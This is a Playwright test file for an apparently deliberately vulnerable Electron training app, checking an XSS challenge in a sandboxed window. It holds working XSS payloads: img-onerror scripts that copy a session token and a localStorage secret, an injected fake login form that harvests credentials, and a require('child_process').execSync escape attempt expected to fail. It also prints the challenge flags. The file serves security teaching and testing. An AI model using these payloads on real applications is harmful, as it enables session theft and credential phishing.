// Behavioral test for Challenge 1 — Contained (What Can XSS Do in Electron?).
//
// Drives the REAL Electron app (via Playwright's `_electron`) rather than importing internal
// functions, so it exercises the actual injection sink, the actual hardened window, and the
// actual main-process config push — not a mock of any of it. Asserts that the exploit payloads
// genuinely fire and that the escape attempt genuinely fails, not just that the page loads.
const fs = require('node:fs');
const path = require('node:path');
const { test, expect, _electron: electron } = require('@playwright/test');

const APP_DIR = path.resolve(__dirname, '..');
const ELECTRON_BIN = path.join(
  APP_DIR,
  'node_modules/electron/dist/electron' + (process.platform === 'win32' ? '.exe' : '')
);
const MAIN_JS_PATH = path.join(APP_DIR, 'src/main/main.js');

async function inject(win, payload) {
  await win.fill('#xssInput1', payload);
  await win.click('#xssForm1 button[type=submit]');
}

test.describe('Challenge 1 — Contained (XSS)', () => {
  let app;
  let mainWindow;
  let challengeWindow;

  test.beforeAll(async () => {
    app = await electron.launch({
      executablePath: ELECTRON_BIN,
      cwd: APP_DIR,
      args: [APP_DIR],
      // Some shells/CI runners export these for unrelated tooling; if set, Electron runs as
      // plain Node instead of launching the app, so force them off for this launch only.
      env: { ...process.env, ELECTRON_RUN_AS_NODE: '', ELECTRON_NO_ATTACH_CONSOLE: '' },
      timeout: 30_000,
    });

    mainWindow =
      app.windows().find((w) => w.url().includes('index.html')) ||
      (await app.waitForEvent('window', {
        predicate: (w) => w.url().includes('index.html'),
        timeout: 15_000,
      }));
    await mainWindow.waitForLoadState('domcontentloaded');

    const [challengeWin] = await Promise.all([
      app.waitForEvent('window', {
        predicate: (w) => w.url().includes('xss-no-priv.html'),
        timeout: 15_000,
      }),
      mainWindow.evaluate(() => window.api.openXSSContained()),
    ]);
    challengeWindow = challengeWin;

    await challengeWindow.waitForSelector('#session-token');
    // Main pushes window.__dveaWindowConfig via executeJavaScript after did-finish-load;
    // wait for it so the config-badge test below isn't racing that push.
    await challengeWindow.waitForFunction(() => !!window.__dveaWindowConfig, null, { timeout: 5_000 });
  });

  test.afterAll(async () => {
    await app?.close().catch(() => {});
  });

  test('window is created with the hardened config, and badges reflect its real state', async () => {
    // Anchor: assert what main.js actually DECLARES for this window (source-level intent),
    // independent of whether this environment can enforce the OS-level sandbox (see the
    // chrome-sandbox setuid note in CLAUDE.md) — this must always be the hardened config.
    // (Read from source rather than via app.evaluate(): Playwright's Electron evaluate() runs
    // the callback as a bare eval, which has no `require` in scope — there's no CommonJS
    // module wrapper to provide it there, unlike in main.js itself.)
    const mainSrc = fs.readFileSync(MAIN_JS_PATH, 'utf8');
    const fnMatch = mainSrc.match(/function openXSSContainedWindow\(\)[\s\S]*?\n  \}/);
    expect(fnMatch, 'openXSSContainedWindow() not found in main.js').toBeTruthy();
    expect(fnMatch[0]).toMatch(/sandbox:\s*true/);
    expect(fnMatch[0]).toMatch(/contextIsolation:\s*true/);
    expect(fnMatch[0]).toMatch(/nodeIntegration:\s*false/);

    // Effective: what Electron actually applied to this specific window, read straight from
    // the main process via the same getLastWebPreferences() API the Config Inspector uses.
    const effective = await app.evaluate(({ webContents }, urlFragment) => {
      const wc = webContents.getAllWebContents().find((w) => w.getURL().includes(urlFragment));
      if (!wc) return null;
      const wp = wc.getLastWebPreferences() || {};
      return { sandbox: !!wp.sandbox, contextIsolation: !!wp.contextIsolation, nodeIntegration: !!wp.nodeIntegration };
    }, 'xss-no-priv.html');

    expect(effective, 'could not find the challenge window webContents in the main process').toBeTruthy();
    // ContextIsolation/NodeIntegration are enforced by the JS engine regardless of the OS
    // sandbox helper, so these must be true/false for real, not merely declared.
    expect(effective.contextIsolation).toBe(true);
    expect(effective.nodeIntegration).toBe(false);

    // The badges must be a faithful VIEW of that same main-process data, whatever it says —
    // not hardcoded true, and not independently (mis)measured in the renderer.
    const cfg = await challengeWindow.evaluate(() => window.__dveaWindowConfig);
    expect(cfg).toEqual(effective);

    await expect(challengeWindow.locator('#badge-sandbox')).toHaveText(
      `${cfg.sandbox ? '✓' : '✗'} Sandbox: ${cfg.sandbox}`
    );
    await expect(challengeWindow.locator('#badge-isolation')).toHaveText('✓ ContextIsolation: true');
    await expect(challengeWindow.locator('#badge-nodeintegration')).toHaveText('✓ NodeIntegration: false');
    await expect(challengeWindow.locator('#badge-preload')).toHaveText('✓ Privileged bridge: false');

    if (!cfg.sandbox) {
      test.info().annotations.push({
        type: 'note',
        description:
          'Effective sandbox=false in this environment — likely missing the chrome-sandbox ' +
          'setuid fix documented in CLAUDE.md, not a bug in the app. Declared config above was ' +
          'still confirmed hardened.',
      });
    }
  });

  test('Task 1: exfiltrating the session token solves the DOM-theft task', async () => {
    const token = await challengeWindow.locator('#session-token').textContent();
    expect(token).toMatch(/^sess_[0-9a-f]+$/);

    await inject(
      challengeWindow,
      `<img src=x onerror="document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + document.getElementById('session-token').textContent + '</li>')">`
    );

    await expect(challengeWindow.locator('#attacker-log')).toContainText(token);
    await expect(challengeWindow.locator('#task-1-status')).toHaveText('Solved');
    await expect(challengeWindow.locator('#task-1-status')).toHaveClass(/\bpass\b/);
    await expect(challengeWindow.locator('#task-1 .task-flag')).toContainText('DVEA{renderer_dom_theft}');
  });

  test('Task 2: reading localStorage surfaces the stashed flag', async () => {
    await inject(
      challengeWindow,
      `<img src=x onerror="document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + localStorage.getItem('dvea_secret') + '</li>')">`
    );

    await expect(challengeWindow.locator('#attacker-log')).toContainText('DVEA{localStorage_is_reachable}');
    await expect(challengeWindow.locator('#task-2-status')).toHaveText('Solved');
    await expect(challengeWindow.locator('#task-2-status')).toHaveClass(/\bpass\b/);
    await expect(challengeWindow.locator('#task-2 .task-flag')).toContainText('DVEA{localStorage_is_reachable}');
  });

  test('Task 3: injected phishing form harvests a submitted credential', async () => {
    const payload = `<img src=x onerror='
      var out = document.getElementById("xssOutput1");
      out.insertAdjacentHTML("beforeend", "<form id=\\"phish\\"><input id=\\"u\\" placeholder=\\"Username\\"><input id=\\"p\\" type=\\"password\\" placeholder=\\"Password\\"><button>Sign in</button></form>");
      document.getElementById("phish").addEventListener("submit", function (e) {
        e.preventDefault();
        var u = document.getElementById("u").value;
        var p = document.getElementById("p").value;
        document.getElementById("attacker-log").insertAdjacentHTML("beforeend", "<li>cred:" + u + ":" + p + "</li>");
      });
    '>`;
    await inject(challengeWindow, payload);

    // The phishing form is genuinely part of the page now, not a fixture — fill and submit it.
    await challengeWindow.fill('#xssOutput1 #u', 'alice');
    await challengeWindow.fill('#xssOutput1 #p', 'hunter2');
    await challengeWindow.click('#xssOutput1 #phish button');

    await expect(challengeWindow.locator('#attacker-log')).toContainText('cred:alice:hunter2');
    await expect(challengeWindow.locator('#task-3-status')).toHaveText('Solved');
    await expect(challengeWindow.locator('#task-3-status')).toHaveClass(/\bpass\b/);
    await expect(challengeWindow.locator('#task-3 .task-flag')).toContainText('DVEA{xss_phishing_harvest}');
  });

  test('Task 4: the escape attempt genuinely fails and is marked Contained, not Solved', async () => {
    const pageErrors = [];
    challengeWindow.on('pageerror', (err) => pageErrors.push(err.message));

    await inject(challengeWindow, `<img src=x onerror="require('child_process').execSync('id')">`);

    // The escape must actually fail — require must genuinely not exist in this main world.
    // (If this ever starts passing without an error, nodeIntegration/contextIsolation broke.)
    await expect
      .poll(() => pageErrors.some((m) => /require is not defined/.test(m)), {
        message: 'expected an uncaught "require is not defined" error from the escape attempt',
      })
      .toBe(true);

    await expect(challengeWindow.locator('#task-4 .task-flag')).toContainText('DVEA{contained_the_sandbox_held}');
    await expect(challengeWindow.locator('#task-4 .task-flag')).toContainText('sandbox=true');
    await expect(challengeWindow.locator('#task-4 .task-flag')).toContainText('contextIsolation=true');
    await expect(challengeWindow.locator('#task-4 .task-flag')).toContainText('nodeIntegration=false');

    // Distinct from Tasks 1-3: this is a blocked-escape confirmation, not an exploit success —
    // it must NOT render as green "Solved".
    await expect(challengeWindow.locator('#task-4-status')).toHaveText('Contained ✓');
    await expect(challengeWindow.locator('#task-4-status')).toHaveClass(/\bcontained\b/);
    await expect(challengeWindow.locator('#task-4-status')).not.toHaveText('Solved');
    await expect(challengeWindow.locator('#task-4-status')).not.toHaveClass(/\bpass\b/);
  });

  test('progress reaches 4 / 4 once all tasks are complete', async () => {
    await expect(challengeWindow.locator('#flag-progress')).toHaveText('(4 / 4 flags captured)');
  });
});
